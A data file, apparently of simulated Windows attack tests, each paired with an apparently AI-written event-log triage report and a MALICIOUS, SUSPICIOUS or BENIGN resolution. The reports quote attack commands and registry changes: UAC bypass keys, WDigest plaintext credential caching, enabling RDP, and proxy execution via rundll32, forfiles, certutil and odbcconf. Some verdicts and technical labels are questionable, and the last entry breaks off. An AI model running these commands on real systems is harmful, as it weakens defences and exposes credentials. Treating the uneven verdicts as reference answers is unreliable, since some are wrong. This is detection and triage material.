UAC Bypass with WSReset Registry Modification,"In the provided Windows event logs, there are several indicators of potentially malicious activity that stand out, specifically within the PowerShell logs:

### Analysis

1. **PowerShell Activity**:
   - The PowerShell logs show multiple commands being executed within a short time frame on `2024-10-27 18:45:25`.
   - A command to create a registry item and set properties under `HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command` with a default value to execute `cmd.exe` is observed. This is a technique often used for persistence and privilege escalation.
   - The script also executes `Start-Process -FilePath ""C:\Windows\System32\WSReset.exe"" -WindowStyle Hidden`, which attempts to hide the window from view, a potential sign of malicious intent.

2. **Security Log**:
   - There are multiple events (`4672`) granting special privileges (e.g., SeDebugPrivilege, SeImpersonatePrivilege) to `admin_test`. While elevated privileges for an admin account can be normal, in conjunction with other findings, it can indicate potential misuse or compromise.

3. **Sysmon Logs**:
   - Process execution involving `wevtutil.exe` and `conhost.exe` with the `admin_test` user context in quick succession. This could indicate that someone is trying to clear logs or manipulate the console, which might be suspicious.
   - Execution of `whoami.exe` and `hostname.exe` suggests someone might be querying the current user and environment, which could be part of reconnaissance activities.
   - `powershell.exe` is launched with a command that matches the suspicious PowerShell activity described earlier.

4. **Normal System Activity**:
   - Routine system operations like Windows Defender status checks and Microsoft Edge updates are also logged in the Application and Sysmon logs, indicating some usual system maintenance activities. However, they don't mitigate the suspicious PowerShell activity.

### Assessment

Based on the provided log entries, specifically the activities involving registry modification through PowerShell and potential process manipulation, there are clear indicators of potentially malicious behavior. The intention behind modifying registry keys to execute commands and masking the execution with hidden windows suggests an attempt to establish persistence or privilege escalation.

### Resolution: MALICIOUS

The activity observed in the PowerShell logs is indicative of a compromise attempt. The combination of registry manipulation, execution of cmd with potential for hidden execution, and the correlation with elevated privileges, all substantiate the likelihood of malicious intent.

   - Apply any missed security patches and updates to minimize vulnerability to PowerShell and registry exploits.
   - Implement stricter PowerShell script monitoring, logging, and execution policies to block or flag similar activities."
Regsvcs Uninstall Method Call Test,"### Detailed Analysis and Findings

Upon reviewing the provided logs, a pattern of suspicious activity suggests potential malicious activity:

#### Security Log Analysis
- **Events 4624 and 4672**: These logs indicate a logon event (4624) and the assignment of special privileges (4672), which are typically normal under system processes. However, this is associated with the SYSTEM account and carried out by `services.exe`, which generally should not exhibit excessive privilege usage with `SeDebugPrivilege`, `SeImpersonatePrivilege`, etc.
  
- **Events 5888 and 5890**: These logs show modifications and access to COM+ components by a user `admin_test`. This activity happens in rapid succession, looking like potentially automated changes which could indicate lateral movement or setup for persistence.

#### PowerShell Log Analysis
- **Events 600**: These contain suspicious PowerShell activity with commands that appear to be executing a script to convert base64 data and compile a .Net DLL (`data.009.dll`). PowerShell often serves as a vector for attacks due to its powerful scripting capability.

#### Sysmon Log Analysis
- **Multiple Events (Process Creation)**:
  - The execution of `csc.exe` (C# Compiler) and `regsvcs.exe` indicates compiling .Net code and attempting to register it. This behavior can be part of malicious use patterns to deploy malicious services or COM objects.
  - Multiple executions of `wevtutil.exe` and `conhost.exe` by `admin_test` suggest potential tampering or interaction with Windows Event Logs.

- **Notable Executions**: 
  - `whoami.exe` is executed, possibly to verify logging/privileges by the `admin_test` user.
  - `cvtres.exe` and `msdtc.exe` processes appear related to resource conversion, possibly part of the attack infrastructure setup.

#### Application Log Analysis
- **Event 4202 and 4879**: These show MSDTC activity, possibly related to changes in permissions or settings, which could tie into other COM+ activity noted, facilitating malicious operations.

### Assessment
The combination of privilege escalation events, PowerShell activity leading to local compilation and registration of a DLL, and potential event log tampering gives strong evidence of malicious behavior.

### Resolution and Guidance

Rundll32 with desk.cpl,"During the investigation of the provided Windows event logs, certain events stand out due to their potential to indicate malicious activity. Let's examine the key points:

1. **Time Change Event:**
   - Security Log Event ID 4616 shows time changes, which can be suspicious if not performed by authorized personnel or systems. While the time change itself is not malicious, it could be used to manipulate logs or system time for malicious purposes.

2. **Privileges:**
   - Security Log Event ID 4672 details special privileges assigned to `admin_test`. These privileges include `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeLoadDriverPrivilege`, which are powerful and potentially dangerous if misused. 
   - The presence of `SeDebugPrivilege` is noteworthy as it can be used to debug processes, potentially including malicious operations.

3. **Anomalous Process Execution:**
   - Sysmon Log contains an event where `cmd.exe` runs a command copying `calc.exe` to a file named `not_an_scr.scr` and then uses `rundll32.exe` with `desk.cpl,InstallScreenSaver`, indicating an attempt to disguise the executable, potentially deploying or testing malicious payloads:
     ```
     ""cmd.exe"" /c copy %%windir%%\\System32\\calc.exe not_an_scr.scr & rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
     ```

4. **Execution of Microsoft Edge Updater:**
   - Repeated entries in the Sysmon Logs showing `Microsoft Edge` and `EdgeUpdate` installers being executed. While these could be legitimate updates, they should be cross-verified for authenticity, especially under the SYSTEM user context.

5. **Network Activities:**
   - There were no specific network log entries that could definitively indicate anomalies, but leveraging tools like `wevtutil.exe`, `conhost.exe`, and `whoami.exe` multiple times in sequence might suggest reconnaissance or environment enumeration.

Based on the analysis provided, the activities found could indicate potential malicious intentions, especially the obfuscation attempts and unusual privilege escalations seen. However, confirming malicious activity requires additional context and validation, such as network logs, asset usage patterns, and user behavior profiles.

**Resolution:** **SUSPICIOUS**

**Guidance:**
- Conduct a deeper investigation into the user and process activities identified as suspicious.
- Validate the origin and legitimacy of the `EdgeUpdate` activities.
- Review other related network logs and system changes during this timeframe for additional context.

Enable RDP via Registry (fDenyTSConnections),"Upon reviewing the provided Windows event logs, I will conduct a detailed analysis to identify any anomalous or potentially malicious activities.

### Analysis

1. **Edge Update Events:**
   - Repeated events related to `MicrosoftEdgeUpdate.exe` performing various update and registration tasks were noted. These events appear to be consistent with routine automatic updates for Microsoft Edge, which is typical behavior within an enterprise environment using Microsoft's software update mechanism.
   - No unusual command-line arguments or behavior was detected that would suggest tampering or exploitation associated with these processes.

2. **Time Changes:**
   - There are events showing changes to the system time, which can sometimes indicate suspicious behavior if unauthorized. However, these appear to be linked with regular time synchronization processes, as indicated by the `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` logs, with time adjustments aligning to `time.windows.com`.

3. **Process Executions:**
   - Several `Sysmon` logs show the execution of common Windows utility processes such as `wevtutil.exe`, `cmd.exe`, and `svchost.exe`. Notably, a `cmd.exe` instance executing a registry modification to enable Terminal Services connections was recorded:
     - **Command:**
       ```
       cmd.exe /c reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f
       ```
     - This registry change allows Remote Desktop Connections, which can be considered risky and potentially indicative of unauthorized access attempts or policy changes being made. This action warrants further investigation.

4. **Logon Events and Privilege Escalations:**
   - The `Security` logs show expected system maintenance logon sessions for SYSTEM and Network Service accounts. These logs are typical for a functioning server but should be monitored if such changes occur frequently without a clear administrative task dictating their necessity.

5. **New Process Executions:**
   - The execution of processes such as `whoami.exe` and `hostname.exe` are consistent with administrative queries and do not exhibit malicious parameters.

### Assessment

The logs reviewed mostly describe routine system operations and maintenance activities. However, the registry modification allowing Remote Desktop Connections (`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server`) is suspicious, as it can indicate a security policy change that should strictly align with organizational policy. This action requires evaluation in the context of authorized administrative changes or breaches.

### Resolution: SUSPICIOUS

While most activities appear benign, the registry modification for Remote Desktop deserves further investigation. It is crucial to:
- **Verify** if this action was authorized by the IT administration.
- **Review** user activity logs to confirm legitimate administrative changes.
- **Inspect** other security mechanisms such as firewalls and access control lists to ensure no unauthorized access coincided with this change.
  
These steps should ascertain whether the observed activity aligns with authorized maintenance or poses a security risk."
Indirect Command Execution - forfiles.exe,"Upon analyzing the provided Windows event logs, let's identify any suspicious or anomalous behavior that may indicate malicious activity or a potential compromise.

### Detailed Log Analysis:

#### Application Log:
1. **SecurityCenter and EdgeUpdate Events:**
   - Windows Defender is consistently on, as indicated by the events from ""SecurityCenter."" No issues detected here.
   - The ""edgeupdate"" service is consistently stopping and restarting. Service operations are normal procedures for updating software, particularly for browsers like Microsoft Edge.

#### Sysmon Log:
1. **Process Creation and Execution:**
   - There are multiple instances of normal Windows system processes and applications such as `wevtutil.exe`, `conhost.exe`, `MpSigStub.exe`, `wuauclt.exe`, `MpCmdRun.exe`, and others being executed by `NT AUTHORITY\SYSTEM` or the user `SERVER002\admin_test` with a high integrity level. These processes are typically expected and are part of system operations.
   - **Anomalous Command:**
     - The command involving `cmd.exe` with “/c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe” is suspicious. It attempts to execute the calculator app (`calc.exe`) via a mechanism (`forfiles`) often associated with more scripted or automated tasks. This could indicate an obfuscated or scripted attempt to run undesirable actions using known software as a vector.

2. **Microsoft Edge Update:**
   - Multiple logs are related to `MicrosoftEdgeUpdate.exe` activities, representing standard update operations for the browser. However, the frequent instances could indicate automation or configuration requiring frequent checks, or it could be standard policy.

#### Security Log:
1. **Group Membership Enumeration (EventID 4798):**
   - It enumerates user groups like 'Administrator', 'admin_test', Directly listing members of groups isn’t suspicious by itself, but the context around other event identifiers could indicate attempts to probe or map access permissions.
   
2. **Failed Operations:**
   - Accounts or components tied to Windows Live or Microsoft accounts (EventID 5379) indicate that there could be network-based features trying to operate without full credentials. Commonly, these errors appear due to incorrect configuration or connectivity issues and are not directly suspicious without a triggering context.

#### Summary of Findings:

1. **Suspicious Activity:**
   - The key indicator of suspicious behavior from the logs is related to the use of `forfiles` and `calc.exe`. Such usage without clear purpose or administrator planning might be considered unconventional and warrants closer inspection in the system's context of policy and user activity.

2. **General Operations:**
   - Many entries represent standard scheduled tasks and automatic updates.

### Conclusion:

- **Resolution: SUSPICIOUS**
  - The logs exhibit activity that doesn't align completely with standard user behavior, such as scripting through command-line with non-standard operations for end-users (`forfiles /c`).
 
### Recommended Next Steps:

- **Investigate User Activity:** Investigate user `admin_test` activities and review the origin and content of the script or command observed. 
- **Review System and Network Configuration:** Check for policy changes, and analyze network logs specifically around noted times for external connections or unexpected data flows.
- **Monitor Process Execution:** Set up additional monitoring or auditing for any unusual process creations that resemble or use similar command constructs.
- **Verify Integrity of System Files:** Conduct a security scan or audit on potentially affected directories and binaries (e.g., `notepad.exe`, `calc.exe`, known update paths).

Expedited review and investigative actions should limit potential disruption or exploitation leveraging unconventional methods evident in logs."
System Scope COR_PROFILER,"Upon reviewing the provided event logs, I have identified the following observations which could potentially indicate suspicious or malicious activities:

1. **PowerShell Activities**:
   - There are several PowerShell commands executed which involve modifying registry keys related to profiling using environment variables, setting `COR_ENABLE_PROFILING`, `COR_PROFILER`, and `COR_PROFILER_PATH`. These variables and the `data.012x64.dll` file suggest an attempt to intercept or modify application behavior through profiling, which is often leveraged by attackers to inject malicious DLLs or change application execution.

2. **Profiling DLL Path**:
   - The path specified for `COR_PROFILER_PATH` is in the `Temp` directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.012\\bin\\data.012x64.dll`), which is unusual and can be indicative of malicious activity where malware drops files in temporary directories for execution.

3. **Sysmon Logs - Unusual Processes**:
   - Multiple processes involving `whoami.exe` and querying information like `hostname` seem routine, but coupled with the registry modifications, could be used to gather system information for further exploitation.
   - There are multiple instances of `conhost.exe` and `wsmprovhost.exe` associated with high integrity levels, possibly attempting to provide a legitimate appearance but may be linked to unauthorized privilege escalation activities.

4. **Microsoft Edge Update Logs**:
   - The logs indicate numerous instances of `MicrosoftEdgeUpdate.exe` execution with various command-line arguments, suggesting it might be used for disguising other updates or executions. Normal operations tend to be less frequent and should be verified against the expected update schedule.

**Assessment and Conclusion:**
Given the combination of PowerShell registry alterations, the suspicious use of transient directories for DLL paths, frequent system utility executions (`whoami.exe`, `conhost.exe`), and possibly cloaked Edge updates, we observe substantial evidence of suspicious activity.

- **Resolution**: SUSPICIOUS
- **Guidance**: Further investigation is warranted. Consider isolating the host to prevent potential spread, inspecting the DLL file for malicious code, and reviewing any network connections during these events. Monitoring should continue for any similar activities across other systems, and sharing findings with the security team for thorough threat hunting and mitigation."
WMI Win32_Product Class - Execute Local MSI file with embedded JScript,"After analyzing the provided logs, several observations can be made concerning potentially suspicious behavior:

1. **Use of PowerShell**:
   - The Windows PowerShell logs indicate the execution of the `Invoke-CimMethod` command for installing an MSI package from a temporary directory. Usage of PowerShell to install software, especially from temporary directories, is often considered suspicious if it is not a standard procedure within the organization. The path used (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_JScript.msi`) suggests it is potentially a random or unofficial utility.

2. **Unusual MSI Installation**:
   - The Application logs report on `MsiInstaller` entries without much context indicating the installation was registered with specific Windows Installer product codes. This could indicate that the installation was not part of an official deployment process or properly logged into system records.

3. **Frequent Use of System Utilities**:
   - The Sysmon logs showed multiple instances of standard Windows utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `hostname.exe`. The presence of `whoami.exe` might suggest recon activity to query user or permission information within the system.

4. **Time Synchronization**:
   - Both System and Security logs indicate a change in system time, which corresponds to typical synchronization behavior. This doesn't directly indicate malicious activity but is important context if unexplained time jumps are identified.

5. **Edge Update Process**:
   - Several processes related to `MicrosoftEdgeUpdate.exe` are observed. These are part of normal system update behavior but stand out due to their volume within this short timeframe, demanding verification if such updates align with legitimate update schedules.

**Assessment**:
- The installation of software using PowerShell and the temporary directory as the source indicates potentially unwanted behavior or could be used for unauthorized software installation.
- Running system utilities is common for reconnaissance and could be a prelude to more invasive actions.
- Given the observed anomalies, there is no definitive evidence of a malicious act, but there are enough indicators requiring further investigation.

**Resolution: SUSPICIOUS**
- Further investigation is needed regarding the source and legitimacy of the installed MSI package.
- Verify the update frequency of Microsoft Edge within the organization to rule out unauthorized system modifications.
- Confirm with the server's administrator if these activities align with their sanctioned scripts or administrative processes.
- Conduct a thorough scan for malware, focusing on persistence mechanisms that may have been installed under the radar."
Use Powershell to Modify registry to store logon credentials,"Upon analyzing the event logs provided, several activities stand out which require closer examination:

1. **Registry Modification via PowerShell**:
   - There was a PowerShell command execution that modified the registry key `HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest` to enable `UseLogonCredential`. This action is suspicious because enabling WDigest credential caching can allow access to plain-text passwords, which is often leveraged by attackers for credential theft.
   - This activity is potentially malicious and often indicative of a Pass-the-Hash attack preparation or similar credential harvesting efforts.

2. **Time Change Events**:
   - The system time was modified multiple times in a short duration as indicated in the security and system logs. Although time adjustments can be legitimate, frequent and close proximity to suspicious activity, such as registry modifications, can suggest attempts to create confusion in timestamp logs or bypass time-based security checks.
  
3. **Frequent Use of `wevtutil.exe` and `conhost.exe` by a Non-System Account**:
   - Multiple processes of `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test`. `wevtutil.exe` is commonly used to manage event logs and could be used to clear or tamper logs to erase tracks. This requires careful consideration since `conhost.exe` should be interacting silently without drawing attention. The fact that these are executed by a specific admin user account adds to the suspicion, as it could indicate elevated/unauthorized access.

4. **Regular Activity of Microsoft Edge Update (Various Executables)**:
   - There are a number of expected activities involving `MicrosoftEdgeUpdate.exe` and related processes, which appear normal concerning system updates. These include different paths, command lines, and updates through Edge processes.

**Assessment**:
Given the registry changes through PowerShell which enables a potentially unsafe configuration, potential time tampering, and the peculiar use of wevtutil by a user account, these logs indicate anamolies that should not be present under normal operating conditions. There are clear signs of potential compromise, especially related to credential harvesting attempts.

**Resolution**:
**MALICIOUS** - The presence of registry changes that could lead to credential exposure along with other suspicious activities indicates these logs contain activity that could have malicious intent. Further investigation and immediate remedial action should be taken to safeguard credentials and rectify the changes.

**Guidance**:
- Immediately investigate the affected system for unauthorized access or lateral movement attempts.
- Review the credentials of affected user accounts and consider credential rotation.
- Why was WDigest enabled? Determine if legitimate service requires it and disable if unnecessary.
- Conduct a thorough inspection of additional systems for similar activities indicating broader impact.
- Ensure proper logging and alerting mechanisms to quickly detect similar future actions."
Deobfuscate-Decode Files Or Information,"In reviewing the provided logs for potential indicators of malicious activity, several points of interest have been identified that warrant further investigation. Let's break down each log entry and analyze related activities.

### Application Log
The application log provided shows a normal operation entry for the Software Protection Platform Service, which is not indicative of malicious behavior by itself. 

### Security Log
- **Event ID 4634**: Indicates a logoff event for the user `admin_test`, which is relatively normal.
- **Event ID 4672**: Shows that `admin_test` is receiving special privileges, including `SeDebugPrivilege`, which can be used maliciously for privilege escalation or other unauthorized operations. This should be scrutinized further, especially considering the context.
- **Event ID 4624**: A logon event for `admin_test` via NTLM, which can be normal, but the use of NTLM should be reviewed within the context of the network's security policies, especially given modern security guidelines that prefer Kerberos over NTLM. The IP address `192.168.0.102` is noted for follow-up to determine if the source is trusted.

### Sysmon Log
- Multiple entries showing the execution of `wevtutil.exe` and `conhost.exe` under `admin_test`. 
  - `wevtutil.exe` is commonly used to manage Windows Event logs. Multiple executions in a short time span might suggest someone cleaning up logs or examining logs suspiciously.
- **Event ID 1 with Command Line**: The `cmd.exe` usage with the command line invoking `certutil` to encode and decode `calc.exe` is suspicious. Certutil is often used by attackers to encode and decode malicious binaries since it is a trusted system binary (LOLBIN - Living off the Land Binary) and a part of `Living off the Land` technique.
  - Encoding and decoding a known executable (`calc.exe`) could indicate attempts at evasion by disguising or modifying a payload.
  - The command used merits strong suspicion and further analysis is required to verify intent and origin.
- **Event ID 1 `whoami.exe`**: Can be benign but often used in attack scenarios to check the currently logged in user’s identity and privileges.
- **Multiple Certutil.exe Executions**: Even more concerning given their timing and process lineage indicating the encoding and decoding operations simulating a dropper or payload detonation methodology.

### Conclusion
Given the analysis, activities such as granting `admin_test` elevated privileges and suspicious command executions via cmd with `certutil` strongly point towards potentially malicious intentions. These could represent an attempt to execute or prepare a payload on `SERVER002`.

**Resolution**: **SUSPICIOUS**

### Guidance
1. **Immediate Actions**: 
   - Initiate a deep-dive investigation into the `admin_test` account to determine if it is compromised.
   - Conduct a network analysis of the associated `192.168.0.102` IP for irregularities or unauthorized access.
   - Examine `SERVER002` for any other signs of intrusion or lateral movement.

2. **Mitigation Steps**:
   - Isolate the potentially affected system(s) for forensic analysis.
   - Check for potential indicators of compromise like unexpected scheduled tasks or persistence mechanisms.
   - Patch and review defenses to include detection for `certutil` abuse and frequent privilege adjustments.
   - Engage in user account reviews to revoke unnecessary privileges and implement stronger authentication controls.

Further investigation is required to confirm malicious intent definitively and engage response actions appropriately."
Lolbas ie4uinit.exe use as proxy,"I have analyzed the provided logs across the PowerShell, Sysmon, Application, Security, and System channels. Based on the log entries available, I have identified the following observations and potential concerns:

1. **PowerShell Activity**: There are no specific logs provided from the PowerShell channel, limiting the visibility into script execution or command-line activities that might typically signal malicious intent.

2. **Usage of `conhost.exe` and `wevtutil.exe`**: These processes were executed several times, but their invocation by the `admin_test` user on `Server002` does not exhibit immediate signs of malicious intent on their own without additional context or associated suspicious command-line parameters. These are common processes in system operations and are not inherently malicious.

3. **Unusual Process Execution**: 
   - The execution of `cmd.exe` with a `copy` command involving `ie4uinit.exe` to a temporary directory, followed by executing with `-BaseSettings`, can indicate suspicious activity. This behavior often aligns with attempts to execute unsigned or potentially malicious code.
   - The sequence involving `ie4uinit.exe`, `rundll32.exe`, and other processes could represent a typical pattern seen in certain attack vectors, such as DLL Side-Loading, where legitimate Windows processes are leveraged to execute malicious DLLs.

4. **Execution of `whoami.exe` and `hostname.exe`**: These tools are used to gather system information by users or attackers. The execution itself is not directly malicious but could accompany reconnaissance activities in a larger compromise.

5. **Microsoft Edge Update Activity**: The logs show frequent execution of `MicrosoftEdgeUpdate.exe` and related processes. This behavior, while frequent, appears to be consistent with typical update activities by legitimate software services and is not necessarily malicious without more context indicating otherwise.

6. **Security Events**: Events such as privilege use and logon activities show SYSTEM-level interactions and tasks running under NT AUTHORITY, typical in system operations.

7. **Potential Anomaly**: The most significant potential sign of concern relates to the observed operations involving the `cmd.exe`, `copy`, and subsequent execution of potentially manipulated binaries. This activity is mildly suspicious and warrants further investigation.

Based on the current analysis, the logs show a blend of legitimate activities with a few potentially unusual patterns that warrant further inspection. None of the observed events are definitively malicious, but the behavior of the `cmd.exe` execution suggests the need for additional scrutiny.

**Final Assessment**:
- **Resolution: SUSPICIOUS** – There are activities that look irregular, particularly involving `cmd.exe` with file copying and execution in a temporary directory, suggesting further investigation is necessary.
  
**Guidance**:
1. Investigate the specific commands executed by `cmd.exe` and the origin of any transferred or executed binaries.
2. Check for additional logs correlating with these processes to determine intent or system alterations.
3. Consider scanning the system for indicators of compromise (IoCs) and ensure all applications and system components are up to date.
4. Monitor user activities and privilege escaalations related to the `admin_test` account and verify the legitimacy of associated actions."
Odbcconf.exe - Execute Arbitrary DLL,"Upon conducting a detailed analysis of the provided logs, here are the findings:

1. **Use of `odbcconf.exe` for DLL Registration:**
   - In the Sysmon logs, there is an instance where a command is executed through `cmd.exe` with the command line that includes `odbcconf.exe /S /A {REGSVR ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.008\\src\\Win32\\data.dll""}`. This is suspicious as `odbcconf.exe` is often leveraged for DLL side-loading attacks by attackers to register malicious DLLs. The specific use of a temporary directory adds further suspicion, as temporary directories are frequently used in attacks to hide malicious activities.

2. **Multiple PowerShell Executions:**
   - There's evidence of multiple PowerShell executions (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`), albeit without specific commands noted in the logs. Without additional context or command line details, it's challenging to assess whether these were benign or potentially malicious. However, PowerShell is often used by cyber adversaries for malicious purposes, including downloading payloads, executing scripts, and bypassing security controls.

3. **Use of `wevtutil.exe`:**
   - The logs show the execution of `wevtutil.exe`, which is a legitimate Windows utility for managing event logs. It could be used maliciously to clear logs to cover tracks post-compromise. Without additional context on what specific actions were taken, it's ambiguous.

4. **Regular System Utilities:**
   - Processes like `whoami.exe`, `hostname.exe`, and `conhost.exe` appear in the logs. These are typically benign utilities used for system operations. Their presence alone without suspicious command line parameters is not necessarily indicative of malicious intent.

5. **EdgeUpdate Executions:**
   - Frequent executions and stops of `MicrosoftEdgeUpdate.exe` are noted, which are consistent with regular software update behavior for Microsoft Edge. Given the regularity and lack of abnormal instructions, this appears to be benign and part of the normal update cycle.

6. **Security and Application Logs:**
   - The application log entries are typical log messages from Windows Defender indicating its active state, without any noted alerts for detected threats. Similarly, the security logs were not provided, which might have given more details on access control and potential unauthorized access attempts.

Based on the analysis:

**Assessment: SUSPICIOUS**

- **Resolution:** The activity observed with `cmd.exe` invoking `odbcconf.exe` for DLL registration is particularly concerning and merits further investigation. The power shell activities should be reviewed in greater detail if command line logs or PowerShell script block logs can be obtained. Reviewing network activity for anomalous connections around the times of these events would also be beneficial. Additional logs, such as detailed security events, could provide more insight into possible unauthorized access attempts or privilege escalations.

**Guidance:** Conduct a deeper forensic analysis. Verify the legitimacy of the DLL mentioned in the suspicious command `data.dll`. Check for any persistent threats or unauthorized DLLs within the system, and ensure that the rest of the system is scanned for indicators of compromise (IoCs)."
HTML Smuggling Remote Payload,"Upon analyzing the event logs provided, several indicators of suspicious and potentially malicious activity stand out. Here is a detailed breakdown:

1. **Security Log (Event ID 5379)**:
   - Multiple logon attempts with the user ""MicrosoftAccount:user=02txoixylodcstop"" and a return code of ""3221226021"". This return code indicates a logon failure, which may suggest brute force attempts or unauthorized access attempts.

2. **Sysmon Log**:
   - Multiple instances of PowerShell and WMI Provider Host (WmiPrvSE.exe) execution. PowerShell is often used by attackers for malicious activity due to its powerful capabilities.
   - The executing user ""SERVER002\\admin_test"" for PowerShell and other command-line tools (e.g., conhost.exe, wevtutil.exe) is unusual unless intended by administrative or automation tasks, particularly when the PowerShell process is executing a script located in the temp directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.006\\bin\\data_006_remote.html`). Scripts in temp directories are often indicative of malicious download and execution attempts.
   - Multiple Microsoft Edge instances running from a PowerShell process executing a script in a temp location is not typical behavior. This could point to an attempt to exploit vulnerabilities or execute commands via a browser window.

3. **Windows PowerShell Log (Event ID 600)**:
   - Execution of a PowerShell script (`data_006_remote.html`) from a temp directory deviates from normal administrative tasks. This suggests potential malicious actions, like downloading or executing malware, as temp directories are commonly used to deposit malicious files.

While there aren't definitive indicators of a compromise (such as known-malicious hashes or confirmed data exfiltration), the logs exhibit sufficiently suspicious behavior to warrant further investigation. Notably, the combination of failed logon attempts with a Microsoft Account, execution of scripts from a temp directory via PowerShell, and leveraging host command-line utilities suggest potential adversarial techniques commonly associated with initial access or execution phases of a cyber attack.

**Resolution: SUSPICIOUS**

### Guidance:
- Conduct a thorough investigation into the PowerShell activity and the script found in the temp directory. Verify if this script is known and authorized.
- Check for any unauthorized changes or unauthorized users added to the system.
- Look for any signs of persistence mechanisms that may have been established.
- Review firewall and network logs for any unusual outbound connections.
- Consider isolating the affected host until a comprehensive analysis can be completed to ensure the integrity of the network.
- Enhance monitoring for any sudden changes or similar unusual activities across other systems in the network."
Bypass UAC using Fodhelper - PowerShell,"Upon analyzing the provided event logs, I identified some key patterns and potential security concerns:

### Security Log Analysis:
1. **Security Log EventID 4624 (Logon Success)**: 
   - The log indicates a successful logon for the SYSTEM account using ""Advapi"" with a ""LogonType"" of 5, which is a service logon. This is a normal system behavior when services start.
   
2. **Security Log EventID 4672 (Special Privileges)**:
   - This log records a SYSTEM user acquiring a wide array of privileges, including `SeDebugPrivilege` which allows for debugging and is often scrutinized heavily. The acquisition of these privileges can be normal for certain processes but should be monitored based on context.

### PowerShell Log Analysis:
1. **PowerShell EventID 600**:
   - A script is seen modifying registry keys to set commands for `ms-settings` with `cmd.exe` as the default action, followed by starting `fodhelper.exe`. This suggests a UAC (User Account Control) bypass technique using the `fodhelper.exe` method, which is a known technique used by attackers to escalate privileges without prompting UAC.

### Application Log Analysis:
- **Windows Defender Status**: 
  - Repeated logs show Windows Defender is on, which is expected and indicates that basic antivirus measures are active.

### Sysmon Log Analysis:
1. **Process Creation Patterns**:
   - A significant number of processes related to `MicrosoftEdgeUpdate.exe` executing with various command line arguments are noted, and although frequent activity might indicate regular update checks by Microsoft Edge, it's important to verify the legitimacy of these actions.
   
2. **Unusual PowerShell Execution**:
   - The logs show PowerShell executing a command that attempts registry modification for `HKCU:\\software\\classes\\ms-settings\\shell\\open\\command`. This aligns with the aforementioned UAC bypass technique, which is suspicious.

### Conclusion and Recommendation:
- The combination of the registry changes via PowerShell, especially involving `fodhelper.exe`, suggests potential adversarial behavior indicative of an attempted privilege escalation or execution bypass. Although these alterations could be caused by legitimate administrative scripts, they are commonly linked with exploitation tactics.
  
- **Resolution**: **MALICIOUS**
  
The alteration of registry keys to facilitate a bypass of User Account Control heavily leans towards malicious activity, particularly since this is a known exploit technique.

### Guidance on Proceeding:
- **Isolate the Host**: To prevent potential spread or further compromise, temporarily isolate the affected machine from the network.
- **Further Investigation**: Conduct a thorough investigation of user accounts and administrative actions around the time of the suspicious activities.
- **Threat Hunt**: Search for other suspicious activities or indicators matching this behavior across other network systems.
- **Remediation**: Roll back the registry changes and scan the system with up-to-date anti-malware solutions.
- **Review Policies**: Ensure that restrictive policies are applied on PowerShell usage and monitor any future administrative actions precisely. 

It's imperative to determine how this activity began to prevent future incidents and bolster defenses against similar threats."
Lolbin Jsc.exe compile javascript to exe,"Upon reviewing the provided Windows event logs from the Application, System, Sysmon, and Security logs, here is a detailed analysis:

1. **Time Synchronization Events**:  
   The System and Security logs show events related to time synchronization, with events indicating that the time was set by the Windows Time Service (`EventID: 35`) and reflected in the Security log (`EventID: 4616`). The time was adjusted by the service `svchost.exe` running under `LOCAL SERVICE`. This is a normal activity for Windows servers to ensure correct time settings and does not indicate malicious behavior.

2. **Process Executions**:  
   The Sysmon logs (`EventID: 1` and `EventID: 5`) reveal a series of process executions involving common Windows utilities and command-line processes. The following executions stand out:

   - `powershell.exe`: It is executed by the user `SERVER002\admin_test`. While PowerShell can be used maliciously, without additional context such as suspicious command-line arguments, its execution by itself is not inherently malicious.
   
   - `wevtutil.exe`: A utility used for querying and modifying event logs. Its execution under `SERVER002\admin_test` is also observed several times. This could be part of normal system administration or scripting, but repeated executions could warrant further investigation into the purpose.

   - `cmd.exe` and subsequent executions of `jsc.exe` and `cvtres.exe`: These utility executions are used for compiling `.js` files presumably for scripting operations, which can be part of legitimate activity but can also be suspicious if unexpected.
   
   - `whoami.exe`: It's used to display logged-on user information, which may be benign for a user checking their session but can be part of reconnaissance in adversarial scenarios.

3. **Possible Indicators of Administrative Scripts**:  
   The sequence involving `cmd.exe`, `jsc.exe`, and `cvtres.exe` suggests the automation of a build or script execution process, potentially for development purposes. The presence of temporary files and compilation activity supports this narrative. However, if such activities are out of character for the user or the server's role, they merit further inquiry.

4. **Integrity Levels and Privilege Use**:  
   All observed processes appear to be running under `High Integrity`, which is expected for legitimate administrative operations. There is no explicit evidence of privilege escalation or unexpected integrity level changes.

**Assessment and Conclusion**:
- **BENIGN**: The logs contain activity that pertains to normal system operations and potential administrative scripting tasks. The PowerShell and command execution activities do not have accompanying suspicious command-line arguments or known indicators of compromise that would definitively classify them as malicious.
  
**Guidance on Proceeding**:
- Maintain vigilance and improve monitoring on `SERVER002` for better contextualization of PowerShell and utility uses.
- Verify with the responsible team if the observed activities like `wevtutil.exe` executions and script compilations are expected within their operational tasks.
- Consider creating specific alerts or rules to flag when these utilities are used in non-standard patterns or by unauthorized users."
Disable Windows CMD application,"### Detailed Analysis:

#### 1. Examination of Command-line and Process Activity:
- The Windows Sysmon logs indicate typical usage of system utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe`. These appear to be executed by an Administrator (`SERVER002\\admin_test`) with high integrity level. Such commands are often used for legitimate system checks and typically do not imply malicious activity by themselves.
  
